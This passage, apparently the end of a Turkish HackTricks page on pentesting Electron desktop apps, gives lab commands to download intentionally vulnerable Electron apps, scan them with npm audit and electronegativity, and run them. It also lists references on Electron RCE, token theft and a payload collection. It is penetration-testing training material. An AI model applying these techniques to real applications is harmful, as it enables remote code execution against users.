## Laboratuvarlar

Savunmasız Electron uygulamalarını istismar etmeye yönelik bir laboratuvarı [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) adresinde bulabilirsiniz.<sup>[[4]](#references)</sup>

Bu komutlar laboratuvarda ilerlemenize yardımcı olur:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Mevcut yer işaretleri için daha önce yayımlanan adres: [Electron masaüstü uygulamaları](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Sayfanın tamamına yönelik rota buraya yönlendirilir; geçmişte kullanılan fragment güncel tutulmamaktadır.

## References

- [1] [Electron uygulamalarında Phishing ve kimlik bilgisi toplama](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App'te keyfi dosya okuma](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Context isolation eksikliğini kötüye kullanma - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSS ve RCE ile Modern Masaüstü uygulamalarını hackleme atölyesi](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js güvenliği (ve güvensizliği) hakkında derlenmiş kaynak listesi](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron API'lerinin yanlış kullanımı: Saldırganların ilk tercihi](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payload'ları](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron uygulamalarında tek tıklamayla RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron'ın shell.openExternal() işlevinin tehlikeleri - uzaktan kod yürütmeye giden birçok yol](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Keyfi URL'lere izin verin, keyfi kod yürütülmesini bekleyin](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Eski bir Electron özelliğiyle ünlü bir Japon sohbet aracında RCE elde etme](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Uzaktan Kod Yürütme](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Kısıtlı Modda Uzaktan Kod Yürütme (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webview klavye olayı enjeksiyonuyla tek tıklamayla GitHub Token'ı çalma](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webview'ler ana workbench'te keyfi klavye kısayollarını tetikleyebilir](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: Notebook açılışını onaylatma ve çağıranın sağladığı installExtension context'ini kabul etmeyi durdurma](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: Notebook webview'lerinde programatik webview tuş basımı/tıklamasının yeniden gönderilmesini engelleme](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / yerel workspace eklentileri](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: İki haftada tüm büyük IDE'leri nasıl hackledim](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electron'daki yeni saldırı yüzeylerini keşfederken popüler Masaüstü uygulamalarını ele geçirme](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron Güvenliği](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Her Şeyi Tersine Mühendislikle İnceleme](https://github.com/morluto/rea)
- [24] [REA JavaScript artifact'larının yeniden oluşturulması](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA katmanlar arası JavaScript uygulaması iş akışları](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
